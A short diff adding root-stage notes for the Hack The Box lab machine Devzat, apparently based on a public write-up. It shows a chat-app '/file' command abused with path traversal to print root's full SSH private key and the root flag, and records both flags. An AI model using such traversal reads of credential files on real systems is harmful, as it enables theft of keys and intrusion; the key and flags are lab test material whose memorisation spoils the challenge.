@@ -369,11 +369,40 @@ b758248e48eb2a66fb05450d4949e49e
 
 # Root
 
-
+````
+catherine@devzat:~$ ssh -l catherine -p 8443 localhost
+patrick: Hey Catherine, glad you came.
+catherine: Hey bud, what are you up to?
+patrick: Remember the cool new feature we talked about the other day?
+catherine: Sure
+patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
+catherine: Kinda busy right now 👔
+patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups
+         location.
+catherine: k
+patrick: I also put the main so you could diff main dev if you want.
+catherine: Fine. As soon as the boss let me off the leash I will check it out.
+patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
+devbot: patrick has left the chat
+Welcome to the chat. There are no more users
+devbot: catherine has joined the chat
+catherine: all
+catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
+[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
+[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
+[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
+[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
+[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
+[SYSTEM] -----END OPENSSH PRIVATE KEY-----
+catherine: /file ../root.txt CeilingCatStillAThingIn2021?
+[SYSTEM] 74c7326363e17c6207b1aa98b7cf9ef8
+````
 
 
 # Secrets
 
 * FLAG_USER = b758248e48eb2a66fb05450d4949e49e
+* FLAG_ROOT = 74c7326363e17c6207b1aa98b7cf9ef8
 
 https://0xdf.gitlab.io/2022/03/12/htb-devzat.html
